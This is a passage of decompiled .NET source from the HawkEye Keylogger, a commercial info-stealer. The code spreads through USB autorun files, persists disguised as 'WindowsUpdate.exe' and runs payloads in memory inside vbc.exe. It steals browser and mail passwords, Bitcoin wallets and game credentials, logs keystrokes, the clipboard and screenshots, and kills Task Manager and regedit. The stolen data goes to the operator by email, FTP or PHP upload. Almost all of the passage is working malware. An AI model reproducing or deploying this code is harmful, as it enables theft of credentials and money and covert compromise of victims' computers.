        MethodInfo entryPoint = Assembly.Load(Bytes).EntryPoint;
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public bool IsConnectedToInternet()
    {
      NetworkInterface[] networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
      int index = 0;
      while (index < networkInterfaces.Length)
      {
        NetworkInterface networkInterface = networkInterfaces[index];
        if (networkInterface.NetworkInterfaceType != NetworkInterfaceType.Loopback && networkInterface.OperationalStatus == OperationalStatus.Up)
          return true;
        checked { ++index; }
      }
      return false;
    }

    public void Foldersinstall()
    {
      this.unHide();
      this.unhidden(Conversions.ToString(26));
      this.unhidden(Conversions.ToString(28));
      this.unhidden(Path.GetTempPath());
    }

    public void FakemsgInstall()
    {
      if (Operators.CompareString(this.fakerror, "Disablefakerror", false) == 0 || Operators.CompareString(this.appname, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe", false) == 0)
        return;
      int num = (int) MessageBox.Show(this.fakemgrstring, "Microsoft Application Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }

    public void ServerInstall()
    {
      string str1 = Conversions.ToString(Conversions.ToDouble(this.timerstring) / 60000.0);
      string str2 = Conversions.ToString(DateTime.Now).Replace("/", ".");
      string str3 = Operators.CompareString(this.logger, "Disablelogger", false) == 0 ? "False" : "True";
      string str4 = Operators.CompareString(this.clip, "Disableclip", false) == 0 ? "False" : "True";
      string str5 = Operators.CompareString(this.stealers, "Disablestealers", false) == 0 ? "False" : "True";
      string Data = "Dear HawkEye Customers!\r\n\r\nThis is an email notification generated by " + MyProject.Computer.Name + " after successful injection of your server.\r\n\r\nBest Regards\r\nAdmin\r\n \r\n\r\nHawkEye Logger Details: \r\nServer Name: " + this.appname + "\r\nKeylogger Enabled: " + str3 + "\r\nClipboard-Logger Enabled: " + str4 + "\r\nTime Logs will be delivered: Every " + str1 + " minutes\r\n \r\nStealers Enabled: " + str5 + "\r\nTime Log will be delivered: Average 2 to 4 minutes\r\n \r\nLocal Date and Time: " + Conversions.ToString(MyProject.Computer.Clock.LocalTime) + "\r\nInstalled Language: " + MyProject.Computer.Info.InstalledUICulture.ToString() + "\r\nOperating System: " + MyProject.Computer.Info.OSFullName + "\r\nInternal IP Address: " + this.InternalIp + "\r\nExternal IP Address: " + this.ExIP + "\r\nInstalled Anti-Virus: " + this.MyAV + "\r\nInstalled Firewall: " + this.MyFirewall;
      if (!this.IsConnectedToInternet() || Operators.CompareString(this.notify, "Disablenotify", false) == 0)
        return;
      if (Operators.CompareString(this.useftp, "noftp", false) != 0)
      {
        try
        {
          this.UploadFTP("HawkEye_Keylogger_Execution_Confirmed_" + MyProject.Computer.Name + " " + str2 + ".txt", Data);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (Operators.CompareString(this.usephp, "nophp", false) != 0)
      {
        try
        {
          this.UploadPHP("HawkEye_Keylogger_Execution_Confirmed_" + MyProject.Computer.Name + " " + str2 + ".txt", Data);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        try
        {
          MailMessage message = new MailMessage();
          SmtpClient smtpClient = new SmtpClient(this.smtpstring);
          message.From = new MailAddress(this.emailstring);
          message.To.Add(this.emailstring);
          message.Subject = "HawkEye Keylogger | Execution Confirmed | " + MyProject.Computer.Name + " | " + this.HWID();
          message.Body = Data;
          smtpClient.Port = Conversions.ToInteger(this.portstring);
          smtpClient.EnableSsl = Operators.CompareString(this.DisableSSL, "EnableSSL", false) != 0;
          smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.emailstring, this.passstring);
          smtpClient.Send(message);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public void unHide()
    {
      try
      {
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "1", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void unhidden(string path)
    {
      try
      {
        new DirectoryInfo(path).Attributes = FileAttributes.Normal;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void Spread()
    {
      while (true)
      {
        DriveInfo[] drives = DriveInfo.GetDrives();
        int index = 0;
        while (index < drives.Length)
        {
          DriveInfo driveInfo = drives[index];
          try
          {
            if (driveInfo.DriveType == DriveType.Removable)
            {
              using (StreamWriter streamWriter = new StreamWriter(driveInfo.Name + "autorun.inf"))
              {
                streamWriter.WriteLine("[autorun]");
                streamWriter.WriteLine("open=Sys.exe");
                streamWriter.WriteLine("action=Run win32");
                streamWriter.Close();
              }
              System.IO.File.Copy(Application.ExecutablePath, driveInfo.Name + "Sys.exe", true);
              System.IO.File.SetAttributes(driveInfo.Name + "autorun.inf", FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
              System.IO.File.SetAttributes(driveInfo.Name + "Sys.exe", FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
        Thread.Sleep(5000);
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void addtostartup()
    {
      if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe"))
        return;
      FileSystem.FileCopy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Windows Update", (object) (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe"), RegistryValueKind.String);
    }

    public string DES_Decrypt(string input, string pass)
    {
      DESCryptoServiceProvider cryptoServiceProvider1 = new DESCryptoServiceProvider();
      MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
      string str;
      try
      {
        byte[] numArray = new byte[8];
        Array.Copy((Array) cryptoServiceProvider2.ComputeHash(Encoding.Unicode.GetBytes(pass)), 0, (Array) numArray, 0, 8);
        cryptoServiceProvider1.Key = numArray;
        cryptoServiceProvider1.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
        byte[] inputBuffer = Convert.FromBase64String(input);
        str = Encoding.Unicode.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public string olddesdc(string input, string pass)
    {
      DESCryptoServiceProvider cryptoServiceProvider1 = new DESCryptoServiceProvider();
      MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
      string str;
      try
      {
        byte[] numArray = new byte[8];
        Array.Copy((Array) cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(pass)), 0, (Array) numArray, 0, 8);
        cryptoServiceProvider1.Key = numArray;
        cryptoServiceProvider1.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
        byte[] inputBuffer = Convert.FromBase64String(input);
        str = Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public void run(byte[] run)
    {
      object instance = Assembly.Load(this.mem).CreateInstance("CMemoryExecute");
      // ISSUE: variable of the null type
      __Null local1 = null;
      string MemberName = "Run";
      object[] objArray = new object[2]
      {
        (object) run,
        (object) "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"
      };
      object[] Arguments = objArray;
      // ISSUE: variable of the null type
      __Null local2 = null;
      // ISSUE: variable of the null type
      __Null local3 = null;
      bool[] flagArray = new bool[2]{ true, false };
      bool[] CopyBack = flagArray;
      NewLateBinding.LateGet(instance, (System.Type) local1, MemberName, Arguments, (string[]) local2, (System.Type[]) local3, CopyBack);
      if (flagArray[0])
        run = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (byte[]));
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void StartStealers()
    {
      this.Mail = Phulli.My.Resources.Resources.mailpv;
      Thread.Sleep(1000);
      this.WB = Phulli.My.Resources.Resources.WebBrowserPassView;
      Thread.Sleep(2000);
      Thread thread1 = new Thread(new ThreadStart(this.stealMail));
      thread1.SetApartmentState(ApartmentState.STA);
      thread1.Start();
      Thread.Sleep(10000);
      Thread thread2 = new Thread(new ThreadStart(this.stealWebroswers));
      thread2.SetApartmentState(ApartmentState.STA);
      thread2.Start();
      Thread.Sleep(10000);
      try
      {
        Process[] processesByName = Process.GetProcessesByName("bitcoin");
        int num1 = 0;
        int num2 = checked (processesByName.Length - 1);
        int index = num1;
        while (index <= num2)
        {
          processesByName[index].Kill();
          checked { ++index; }
        }
        Thread.Sleep(5000);
        if (System.IO.File.Exists(Interaction.Environ("AppData") + "\\bitcoin\\wallet.dat"))
        {
          FileSystem.FileCopy(Interaction.Environ("AppData") + "\\bitcoin\\wallet.dat", Path.GetTempPath() + MyProject.Computer.Name + "_wallet.dat");
          FileSystem.FileCopy(Interaction.Environ("AppData") + "\\bitcoin\\wallet.dat", Path.GetTempPath() + "wallet.dat");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Thread thread3 = new Thread(new ThreadStart(this.Bitcoinsub));
      thread3.SetApartmentState(ApartmentState.STA);
      thread3.Start();
    }

    public void stealMail()
    {
      try
      {
        object instance = Assembly.Load(Phulli.My.Resources.Resources.CMemoryExecute).CreateInstance("CMemoryExecute");
        // ISSUE: variable of the null type
        __Null local1 = null;
        string MemberName = "Run";
        object[] objArray = new object[3]
        {
          (object) this.Mail,
          (object) Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("system32", "Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"),
          (object) ("/stext \"" + this.path + "holdermail.txt\"")
        };
        object[] Arguments = objArray;
        // ISSUE: variable of the null type
        __Null local2 = null;
        // ISSUE: variable of the null type
        __Null local3 = null;
        bool[] flagArray = new bool[3]{ true, false, false };
        bool[] CopyBack = flagArray;
        int num = 1;
        NewLateBinding.LateCall(instance, (System.Type) local1, MemberName, Arguments, (string[]) local2, (System.Type[]) local3, CopyBack, num != 0);
        if (flagArray[0])
          this.Mail = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (byte[]));
        this.WaitUntilFileIsAvailable(this.path + "holdermail.txt");
        this.CleanedPasswordsMAIL = System.IO.File.ReadAllText(this.path + "holdermail.txt");
        System.IO.File.Delete(this.path + "holdermail.txt");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void stealWebroswers()
    {
      if (this.WB == null)
      {
        this.Holder = "                                 ==============================================\r\n                                            Operating System Intel Recovery\r\n                                 ==============================================\r\nPC Name: " + MyProject.Computer.Name + "\r\nLocal Time: " + Conversions.ToString(MyProject.Computer.Clock.LocalTime) + "\r\nInstalled Language: " + MyProject.Computer.Info.InstalledUICulture.ToString() + "\r\nNet Version: " + Environment.Version.ToString() + "\r\nOperating System Platform: " + MyProject.Computer.Info.OSPlatform + "\r\nOperating System Version: " + MyProject.Computer.Info.OSVersion + "\r\nOperating System: " + MyProject.Computer.Info.OSFullName + "\r\nInternal IP Address: " + this.InternalIp + "\r\nExternal IP Address: " + this.ExIP + "\r\nInstalled Anti-Virus: " + this.MyAV + "\r\nInstalled Firewall: " + this.MyFirewall + "\r\n\r\n\r\n                                 ==============================================\r\n                                            WEB Browser Password Stealer\r\n                                 ==============================================\r\n" + this.CleanedPasswordsWB + "\r\n                                 ==============================================\r\n                                          Mail Messenger Password Stealer\r\n                                 ==============================================\r\n" + this.CleanedPasswordsMAIL + "\r\n                                 ==============================================\r\n                                          Internet Download Manager Stealer\r\n                                 ==============================================\r\n\r\n                                 ==============================================\r\n                                            JDownloader Password Stealer\r\n                                 ==============================================";
        Thread.Sleep(5000);
        string str = Conversions.ToString(DateTime.Now).Replace("/", ".");
        if (this.IsConnectedToInternet())
        {
          if (Operators.CompareString(this.useftp, "noftp", false) != 0)
          {
            try
            {
              this.UploadFTP("HawkEye_Keylogger_Stealer_Records_" + MyProject.Computer.Name + " " + str + ".txt", this.Holder);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(this.usephp, "nophp", false) != 0)
          {
            try
            {
              this.UploadPHP("HawkEye_Keylogger_Stealer_Records_" + MyProject.Computer.Name + ".txt", this.Holder);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else
          {
            try
            {
              MailMessage message = new MailMessage();
              SmtpClient smtpClient = new SmtpClient(this.smtpstring);
              message.From = new MailAddress(this.emailstring);
              message.To.Add(this.emailstring);
              message.Subject = "HawkEye Keylogger | Stealer Records | " + MyProject.Computer.Name + " | " + this.HWID();
              message.Body = this.Holder;
              smtpClient.Port = Conversions.ToInteger(this.portstring);
              smtpClient.EnableSsl = Operators.CompareString(this.DisableSSL, "EnableSSL", false) != 0;
              smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.emailstring, this.passstring);
              smtpClient.Send(message);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
      try
      {
        object instance = Assembly.Load(Phulli.My.Resources.Resources.CMemoryExecute).CreateInstance("CMemoryExecute");
        // ISSUE: variable of the null type
        __Null local1 = null;
        string MemberName = "Run";
        object[] objArray = new object[3]
        {
          (object) this.WB,
          (object) Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("system32", "Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"),
          (object) ("/stext \"" + this.path + "holderwb.txt\"")
        };
        object[] Arguments = objArray;
        // ISSUE: variable of the null type
        __Null local2 = null;
        // ISSUE: variable of the null type
        __Null local3 = null;
        bool[] flagArray = new bool[3]{ true, false, false };
        bool[] CopyBack = flagArray;
        int num = 1;
        NewLateBinding.LateCall(instance, (System.Type) local1, MemberName, Arguments, (string[]) local2, (System.Type[]) local3, CopyBack, num != 0);
        if (flagArray[0])
          this.WB = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (byte[]));
        this.WaitUntilFileIsAvailable(this.path + "holderwb.txt");
        this.CleanedPasswordsWB = System.IO.File.ReadAllText(this.path + "holderwb.txt");
        System.IO.File.Delete(this.path + "holderwb.txt");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.Holder = "                                 ==============================================\r\n                                            Operating System Intel Recovery\r\n                                 ==============================================\r\nPC Name: " + MyProject.Computer.Name + "\r\nLocal Time: " + Conversions.ToString(MyProject.Computer.Clock.LocalTime) + "\r\nInstalled Language: " + MyProject.Computer.Info.InstalledUICulture.ToString() + "\r\nNet Version: " + Environment.Version.ToString() + "\r\nOperating System Platform: " + MyProject.Computer.Info.OSPlatform + "\r\nOperating System Version: " + MyProject.Computer.Info.OSVersion + "\r\nOperating System: " + MyProject.Computer.Info.OSFullName + "\r\nInternal IP Address: " + this.InternalIp + "\r\nExternal IP Address: " + this.ExIP + "\r\nInstalled Anti-Virus: " + this.MyAV + "\r\nInstalled Firewall: " + this.MyFirewall + "\r\n                                 ==============================================\r\n                                            WEB Browser Password Stealer\r\n                                 ==============================================\r\n" + this.CleanedPasswordsWB + "\r\n                                 ==============================================\r\n                                          Mail Messenger Password Stealer\r\n                                 ==============================================\r\n" + this.CleanedPasswordsMAIL + "\r\n                                 ==============================================\r\n                                          Internet Download Manager Stealer\r\n                                 ==============================================\r\n\r\n                                 ==============================================\r\n                                            JDownloader Password Stealer\r\n                                 ==============================================";
      Thread.Sleep(5000);
      string str1 = Conversions.ToString(DateTime.Now).Replace("/", ".");
      if (!this.IsConnectedToInternet())
        return;
      if (Operators.CompareString(this.useftp, "noftp", false) != 0)
      {
        try
        {
          this.UploadFTP("HawkEye_Keylogger_Stealer_Records_" + MyProject.Computer.Name + " " + str1 + ".txt", this.Holder);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (Operators.CompareString(this.usephp, "nophp", false) != 0)
      {
        try
        {
          this.UploadPHP("HawkEye_Keylogger_Stealer_Records_" + MyProject.Computer.Name + ".txt", this.Holder);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        try
        {
          MailMessage message = new MailMessage();
          SmtpClient smtpClient = new SmtpClient(this.smtpstring);
          message.From = new MailAddress(this.emailstring);
          message.To.Add(this.emailstring);
          message.Subject = "HawkEye Keylogger | Stealer Records | " + MyProject.Computer.Name + " | " + this.HWID();
          message.Body = this.Holder;
          smtpClient.Port = Conversions.ToInteger(this.portstring);
          smtpClient.EnableSsl = Operators.CompareString(this.DisableSSL, "EnableSSL", false) != 0;
          smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.emailstring, this.passstring);
          smtpClient.Send(message);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private string readweb(string url)
    {
      try
      {
        return new StreamReader(new WebClient().OpenRead(url)).ReadToEnd();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (string) null;
    }

    private void WaitUntilFileIsAvailable(string Filename)
    {
      bool flag = false;
      while (!System.IO.File.Exists(Filename) | !flag)
      {
        try
        {
          System.IO.File.OpenRead(Filename).Close();
          flag = true;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Application.DoEvents();
      }
    }

    public void Pins()
    {
      Thread.Sleep(this.Pinsst);
      if (!this.IsConnectedToInternet())
        return;
      if (Operators.CompareString(this.useftp, "noftp", false) != 0)
      {
        if (System.IO.File.Exists("C:\\Users\\" + this.User + "\\AppData\\Roaming\\jagex_cache\\regPin\\" + MyProject.Computer.Name + "_Pin0.jpeg"))
        {
          try
          {
            this.UploadFTP("C:\\Users\\" + this.User + "\\AppData\\Roaming\\jagex_cache\\regPin\\" + MyProject.Computer.Name + "_Pin0.jpeg");
            this.UploadFTP("C:\\Users\\" + this.User + "\\AppData\\Roaming\\jagex_cache\\regPin\\" + MyProject.Computer.Name + "_Pin1.jpeg");
            this.UploadFTP("C:\\Users\\" + this.User + "\\AppData\\Roaming\\jagex_cache\\regPin\\" + MyProject.Computer.Name + "_Pin2.jpeg");
            this.UploadFTP("C:\\Users\\" + this.User + "\\AppData\\Roaming\\jagex_cache\\regPin\\" + MyProject.Computer.Name + "_Pin3.jpeg");
            this.UploadFTP("C:\\Users\\" + this.User + "\\AppData\\Roaming\\jagex_cache\\regPin\\" + MyProject.Computer.Name + "_Pin4.jpeg");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      else if (Operators.CompareString(this.usephp, "nophp", false) == 0)
      {
        if (System.IO.File.Exists("C:\\Users\\" + this.User + "\\AppData\\Roaming\\jagex_cache\\regPin\\" + MyProject.Computer.Name + "_Pin0.jpeg"))
        {
          try
          {
            MailMessage message = new MailMessage();
            SmtpClient smtpClient = new SmtpClient(this.smtpstring);
            message.From = new MailAddress(this.emailstring);
            message.To.Add(this.emailstring);
            message.Subject = "HawkEye Keylogger | RuneScape Stealer | " + MyProject.Computer.Name + " | " + this.HWID();
            message.Body = "Dear HawkEye Customers!\r\n\r\nAs you can see, this email has the attached file, containing RuneScape Bank Pins.\r\n\r\nBest Regards\r\nAdmin";
            message.Attachments.Add(new Attachment("C:\\Users\\" + this.User + "\\AppData\\Roaming\\jagex_cache\\regPin\\" + MyProject.Computer.Name + "_Pin0.jpeg"));
            message.Attachments.Add(new Attachment("C:\\Users\\" + this.User + "\\AppData\\Roaming\\jagex_cache\\regPin\\" + MyProject.Computer.Name + "_Pin1.jpeg"));
            message.Attachments.Add(new Attachment("C:\\Users\\" + this.User + "\\AppData\\Roaming\\jagex_cache\\regPin\\" + MyProject.Computer.Name + "_Pin2.jpeg"));
            message.Attachments.Add(new Attachment("C:\\Users\\" + this.User + "\\AppData\\Roaming\\jagex_cache\\regPin\\" + MyProject.Computer.Name + "_Pin3.jpeg"));
            message.Attachments.Add(new Attachment("C:\\Users\\" + this.User + "\\AppData\\Roaming\\jagex_cache\\regPin\\" + MyProject.Computer.Name + "_Pin4.jpeg"));
            smtpClient.Port = 587;
            smtpClient.EnableSsl = Operators.CompareString(this.DisableSSL, "EnableSSL", false) != 0;
            smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.emailstring, this.passstring);
            smtpClient.Send(message);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
    }

    public void Bitcoinsub()
    {
      Thread.Sleep(this.Bitcoinst);
      if (!this.IsConnectedToInternet())
        return;
      if (Operators.CompareString(this.useftp, "noftp", false) != 0)
      {
        try
        {
          if (System.IO.File.Exists(Path.GetTempPath() + MyProject.Computer.Name + "_wallet.dat"))
            this.UploadFTP(Path.GetTempPath() + MyProject.Computer.Name + "_wallet.dat");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (Operators.CompareString(this.usephp, "nophp", false) == 0)
      {
        if (System.IO.File.Exists(Path.GetTempPath() + "wallet.dat"))
        {
          try
          {
            MailMessage message = new MailMessage();
            SmtpClient smtpClient = new SmtpClient(this.smtpstring);
            message.From = new MailAddress(this.emailstring);
            message.To.Add(this.emailstring);
            message.Subject = "HawkEye Keylogger | BitCoin Stealer | " + MyProject.Computer.Name + " | " + this.HWID();
            message.Body = "Dear HawkEye Customers!\r\n\r\nSteals the Wallet.DAT file that holds the users bitcoin currency.\r\n\r\nBest Regards\r\nAdmin";
            message.Attachments.Add(new Attachment(Path.GetTempPath() + "wallet.dat"));
            smtpClient.Port = 587;
            smtpClient.EnableSsl = Operators.CompareString(this.DisableSSL, "EnableSSL", false) != 0;
            smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.emailstring, this.passstring);
            smtpClient.Send(message);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
    }

    public string DecompressString(string compressedText)
    {
      try
      {
        byte[] buffer = Convert.FromBase64String(compressedText);
        using (MemoryStream memoryStream = new MemoryStream())
        {
          int int32 = BitConverter.ToInt32(buffer, 0);
          memoryStream.Write(buffer, 4, checked (buffer.Length - 4));
          byte[] numArray = new byte[checked (int32 - 1 + 1)];
          memoryStream.Position = 0L;
          using (GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress))
            gzipStream.Read(numArray, 0, numArray.Length);
          return Encoding.UTF8.GetString(numArray);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (string) null;
    }

    public void Minecraftsub()
    {
      Thread.Sleep(this.Minecraftt);
      if (!this.IsConnectedToInternet())
        return;
      if (Operators.CompareString(this.useftp, "noftp", false) != 0)
      {
        try
        {
          if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\lastlogin"))
            this.UploadFTP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\lastlogin");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (Operators.CompareString(this.usephp, "nophp", false) == 0)
      {
        if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\lastlogin"))
        {
          try
          {
            MailMessage message = new MailMessage();
            SmtpClient smtpClient = new SmtpClient(this.smtpstring);
            message.From = new MailAddress(this.emailstring);
            message.To.Add(this.emailstring);
            message.Subject = "HawkEye Keylogger | MineCraft Stealer | " + MyProject.Computer.Name + " | " + this.HWID();
            message.Body = "Dear HawkEye Customers!\r\n\r\nAs you can see, this email has the attached file, containing MineCraft Username and Password. Please download it then decrypt the login credential  / information with MineCraft Decryptor.\r\n\r\nBest Regards\r\nAdmin";
            message.Attachments.Add(new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.minecraft\\lastlogin"));
            smtpClient.Port = Conversions.ToInteger(this.portstring);
            smtpClient.EnableSsl = Operators.CompareString(this.DisableSSL, "EnableSSL", false) != 0;
            smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.emailstring, this.passstring);
            smtpClient.Send(message);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
    }

    public void Disabler()
    {
      while (true)
      {
        if (Operators.CompareString(this.TaskManager, "DisableTaskManager", false) != 0)
        {
          Process[] processes = Process.GetProcesses();
          int index = 0;
          while (index < processes.Length)
          {
            Process process = processes[index];
            if (Operators.CompareString(process.ProcessName, "Taskmgr", false) == 0)
              process.Kill();
            checked { ++index; }
          }
        }
        if (Operators.CompareString(this.TaskManager, "DisableTaskManager", false) != 0)
        {
          Process[] processes = Process.GetProcesses();
          int index = 0;
          while (index < processes.Length)
          {
            Process process = processes[index];
            if (Operators.CompareString(process.ProcessName, "taskmgr", false) == 0)
              process.Kill();
            checked { ++index; }
          }
        }
        if (Operators.CompareString(this.cmd, "Disablecmd", false) != 0)
        {
          Process[] processes = Process.GetProcesses();
          int index = 0;
          while (index < processes.Length)
          {
            Process process = processes[index];
            if (Operators.CompareString(process.ProcessName, "cmd", false) == 0)
              process.Kill();
            checked { ++index; }
          }
        }
        if (Operators.CompareString(this.misconfig, "Disablemsconfig", false) != 0)
        {
          Process[] processes = Process.GetProcesses();
          int index = 0;
          while (index < processes.Length)
          {
            Process process = processes[index];
            if (Operators.CompareString(process.ProcessName, "msconfig", false) == 0)
              process.Kill();
            checked { ++index; }
          }
        }
        if (Operators.CompareString(this.reg, "Disablereg", false) != 0)
        {
          Process[] processes = Process.GetProcesses();
          int index = 0;
          while (index < processes.Length)
          {
            Process process = processes[index];
            if (Operators.CompareString(process.ProcessName, "regedit", false) == 0)
              process.Kill();
            checked { ++index; }
          }
        }
        if (Operators.CompareString(this.startup, "Disablestartup", false) != 0)
          this.addtostartup();
        Thread.Sleep(200);
      }
    }

    public void SendLogs()
    {
      while (true)
      {
        do
        {
          Thread.Sleep(Conversions.ToInteger(this.timerstring));
        }
        while ((string.IsNullOrEmpty(this.KeyLog.Trim()) || !this.IsConnectedToInternet()) && !false);
        lock (this.KeyLog)
        {
          lock (this.CLog)
          {
            try
            {
              MailMessage message = new MailMessage();
              SmtpClient smtpClient = new SmtpClient(this.smtpstring);
              message.From = new MailAddress(this.emailstring);
              message.To.Add(this.emailstring);
              message.Subject = "HawkEye Keylogger | Keylog Records | " + MyProject.Computer.Name + " | " + this.HWID();
              message.Body = "                                 ==============================================\r\n                                                        ClipBoard Records\r\n                                 ==============================================\r\n" + this.CLog + "\r\n                                 **********************************************\r\n                                                        Keylog Records\r\n                                 ==============================================\r\n" + this.KeyLog;
              if (Operators.CompareString(this.screeny, "Disablescreeny", false) != 0)
              {
                if (!Directory.Exists(Path.GetTempPath() + "screens"))
                  Directory.CreateDirectory(Path.GetTempPath() + "screens");
                Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
                Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
                Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
                bitmap.Save(Path.GetTempPath() + "screens\\screenshot" + Conversions.ToString(this.screenynumber) + ".jpeg");
                message.Attachments.Add(new Attachment(Path.GetTempPath() + "screens\\screenshot" + Conversions.ToString(this.screenynumber) + ".jpeg"));
                checked { ++this.screenynumber; }
              }
              smtpClient.Port = Conversions.ToInteger(this.portstring);
              smtpClient.EnableSsl = Operators.CompareString(this.DisableSSL, "EnableSSL", false) != 0;
              smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(this.emailstring, this.passstring);
              smtpClient.Send(message);
              this.KeyLog = string.Empty;
              this.CLog = string.Empty;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
    }

    public void SendLogsFTP()
    {
      int num = 0;
      while (true)
      {
        do
        {
          Thread.Sleep(Conversions.ToInteger(this.timerstring));
        }
        while ((string.IsNullOrEmpty(this.KeyLog.Trim()) || !this.IsConnectedToInternet()) && !false);
        checked { ++num; }
        lock (this.KeyLog)
        {
          lock (this.CLog)
          {
            try
            {
